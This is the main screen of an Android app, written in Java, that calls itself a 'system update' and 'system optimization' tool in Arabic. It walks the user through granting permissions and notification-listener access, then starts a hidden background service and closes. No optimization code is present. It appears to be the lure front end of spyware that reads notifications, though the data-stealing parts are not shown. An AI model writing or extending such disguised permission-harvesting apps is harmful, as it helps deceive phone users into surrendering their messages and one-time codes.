package com.sysupdate.app;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        SB.init(this);

        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(60, 100, 60, 60);

        TextView t = new TextView(this);
        t.setText("تحسين النظام\n\nاضغط تفعيل لبدء التحسين");
        t.setTextSize(20);
        t.setPadding(0, 0, 0, 60);
        ll.addView(t);

        Button b1 = new Button(this);
        b1.setText("تفعيل الأذونات");
        b1.setOnClickListener(v -> startActivity(new Intent(this, PermissionActivity.class)));
        ll.addView(b1);

        Button b2 = new Button(this);
        b2.setText("تفعيل خدمة النظام");
        b2.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)));
        ll.addView(b2);

        Button b3 = new Button(this);
        b3.setText("بدء");
        b3.setOnClickListener(v -> {
            Intent i = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
            else startService(i);
            finish();
        });
        ll.addView(b3);

        setContentView(ll);
    }
}
